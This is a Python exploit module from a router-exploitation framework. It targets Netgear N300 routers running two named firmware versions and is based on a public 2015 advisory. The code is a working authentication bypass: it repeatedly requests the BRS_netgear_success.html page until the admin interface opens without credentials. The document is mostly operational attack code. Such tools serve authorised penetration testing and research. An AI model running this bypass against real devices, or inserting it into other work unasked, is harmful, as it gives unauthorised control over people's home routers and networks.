# Name:Netgear N300 authentication bypass
# File:n300_auth_bypass.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 16.11.2015
# Last modified: 16.11.2015
# Shodan Dork:
# Description: Bypasses router authentication on Netgear N300 with firmware N300_1.1.0.31_1.0.1.img
#  or N300-1.1.0.28_1.0.1.img other devices may be vulnerable as well
# Based on: http://www.csnc.ch/misc/files/advisories/CSNC-2015-007_Netgear_WNR1000v4_AuthBypass.txt

import time

import core.Exploit

import requests
from interface.messages import print_error, print_success, print_warning


class Exploit(core.Exploit.RextExploit):
    """
Name:Netgear N300 authentication bypass
File:n300_auth_bypass.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 16.11.2015
Description: Bypasses router authentication on Netgear N300 with firmware N300_1.1.0.31_1.0.1.img
    or N300-1.1.0.28_1.0.1.img other devices may be vulnerable as well
Based on: http://www.csnc.ch/misc/files/advisories/CSNC-2015-007_Netgear_WNR1000v4_AuthBypass.txt

Options:
    Name        Description

    host        Target host address
    port        Target port
    """
    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_run(self, e):
        target = "http://" + self.host + ":" + self.port
        try:
            response = requests.get(target, timeout=60)
            if response.status_code == requests.codes.unauthorized:
                print_warning("Password protection detected")
                for i in range(0, 3):
                    time.sleep(1)
                    requests.get(target+"/BRS_netgear_success.html", timeout=60)
                response = requests.get(target, timeout=60)
                if response.status_code == requests.codes.ok:
                    print_success("bypass successful. Now use your browser to have at look at the admin interface.")

        except requests.RequestException:
            print_error("timeout!")

Exploit()
